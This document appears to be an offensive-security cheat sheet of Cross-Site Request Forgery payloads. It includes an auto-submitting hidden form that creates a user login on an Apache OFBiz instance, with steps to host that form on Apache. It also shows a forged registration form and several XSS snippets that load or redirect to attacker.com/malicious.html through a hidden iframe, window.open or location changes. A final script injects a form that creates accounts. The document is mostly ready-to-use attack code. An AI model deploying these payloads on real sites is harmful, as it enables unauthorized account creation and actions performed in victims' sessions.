# **Cross Site Request Forgery (CSRF)**
#### **Payloads**
- Create the csrf.html file in /var/www/html folder.
```
<html>
<body onload="document.forms['csrf'].submit()">
  <form action="https://ofbiz:8443/webtools/control/createUserLogin" method="post" name="csrf">
      <input type="hidden" name="enabled">
      <input type="hidden" name="partyId">
      <input type="hidden" name="userLoginId" value="csrftest">
      <input type="hidden" name="currentPassword" value="password">
      <input type="hidden" name="currentPasswordVerify" value="password">
      <input type="hidden" name="passwordHint">
      <input type="hidden" name="requirePasswordChange" value="N">
      <input type="hidden" name="externalAuthId">
      <input type="hidden" name="securityQuestion">
      <input type="hidden" name="securityAnswer">
   </form>
</body>
</html>
```
- Start Apache server
```
sudo systemctl restart apache2
```

#### **Chaining CSRF attack with XSS**
- Instead of stealing the admin’s session cookie (which might be protected by HttpOnly flags), the attacker uses the XSS to perform actions on behalf of the admin by sending forged requests (CSRF).
- For example, the script could submit forms or trigger admin-only actions like creating new admin accounts, changing permissions, or modifying settings.
This approach is sometimes called "session riding," where the victim’s browser performs the malicious actions unknowingly.

```
<html>
  <body>
    <form action="/loginLogout" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="&#95;token" value="EiTeYZh7AjVQ0fqLRNcKfclmiGhLVMhPSFir1B3Z" />
      <input type="hidden" name="username" value="offsec" />
      <input type="hidden" name="password" value="offsec" />
      <input type="hidden" name="firstName" value="offsec" />
      <input type="hidden" name="lastName" value="offsec" />
      <input type="hidden" name="email" value="offsec@offsec.com" />
      <input type="hidden" name="dType" value="isRegister" />
      <input type="hidden" name="type" value="100" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

- #### Using an iframe to load the HTML page
```
<script>
  var iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  iframe.src = 'https://attacker.com/malicious.html';
  document.body.appendChild(iframe);
</script>
```

- #### Using JavaScript to open the HTML page in a new tab or window
```
<script>
  window.open('https://attacker.com/malicious.html', '_blank');
</script>
```

```
<script>
  window.location = 'https://attacker.com/malicious.html';
</script>
```

```
<script>
  window.location.href = 'https://attacker.com/malicious.html';
</script>
```

- #### Injecting the form directly via XSS payload
```
<script>
  var form = document.createElement('form');
  form.action = '/loginLogout';
  form.method = 'POST';
  form.enctype = 'multipart/form-data';

  var inputs = {
    '_token': 'EiTeYZh7AjVQ0fqLRNcKfclmiGhLVMhPSFir1B3Z',
    'username': 'offsec',
    'password': 'offsec',
    'firstName': 'offsec',
    'lastName': 'offsec',
    'email': 'offsec@offsec.com',
    'dType': 'isRegister',
    'type': '100'
  };

  for (var name in inputs) {
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = name;
    input.value = inputs[name];
    form.appendChild(input);
  }

  document.body.appendChild(form);
  form.submit();
</script>
```